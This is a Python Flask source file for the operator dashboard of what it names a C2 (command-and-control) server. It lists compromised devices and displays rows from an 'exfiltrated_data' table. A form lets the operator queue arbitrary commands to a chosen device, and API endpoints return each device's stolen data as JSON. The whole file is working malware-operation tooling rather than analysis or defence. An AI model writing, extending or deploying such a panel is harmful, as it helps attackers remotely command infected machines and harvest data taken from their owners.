import os
import sqlite3
from flask import Flask, render_template, request, redirect, url_for, jsonify
from db_manager import get_pending_commands, save_data

app = Flask(__name__)
DB_NAME = os.getenv("C2_DB_NAME", "../c2/c2_data.db")

@app.route('/')
def index():
    """Display main dashboard with devices and exfiltrated data."""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM exfiltrated_data ORDER BY timestamp DESC")
    data = cursor.fetchall()
    cursor.execute("SELECT DISTINCT device_id FROM exfiltrated_data")
    devices = [row[0] for row in cursor.fetchall()]
    conn.close()
    return render_template('dashboard.html', data=data, devices=devices)

@app.route('/send_command', methods=['POST'])
def send_command():
    """Queue a new command for a specific device."""
    device_id = request.form.get('device_id')
    command = request.form.get('command')
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('INSERT INTO commands (device_id, command) VALUES (?, ?)', (device_id, command))
    conn.commit()
    conn.close()
    return redirect(url_for('index'))

@app.route('/api/devices')
def api_devices():
    """API endpoint to get list of devices (for AJAX refresh)."""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT DISTINCT device_id FROM exfiltrated_data")
    devices = [row[0] for row in cursor.fetchall()]
    conn.close()
    return jsonify(devices)

@app.route('/api/data/<device_id>')
def api_device_data(device_id):
    """API endpoint to get data for a specific device."""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM exfiltrated_data WHERE device_id = ? ORDER BY timestamp DESC", (device_id,))
    data = cursor.fetchall()
    conn.close()
    return jsonify(data)

if __name__ == '__main__':
    port = int(os.environ.get('DASHBOARD_PORT', 8080))
    app.run(host='0.0.0.0', port=port, debug=False)